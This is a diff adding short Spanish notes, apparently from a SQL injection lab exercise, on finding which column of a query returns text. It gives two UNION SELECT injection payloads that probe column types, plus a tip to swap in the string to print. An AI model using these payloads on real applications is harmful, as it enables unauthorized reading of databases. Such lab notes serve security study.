@@ -1,0 +1,7 @@
+Se nos pide determinar aca cual columna es de tipo string asi que probamos primero
+
+' UNION SELECT 'a',NULL,NULL -- -
+
+' UNION SELECT NULL,'a',NULL -- -
+
+reemplaza a por el texto que sea que se te pida que imprimas
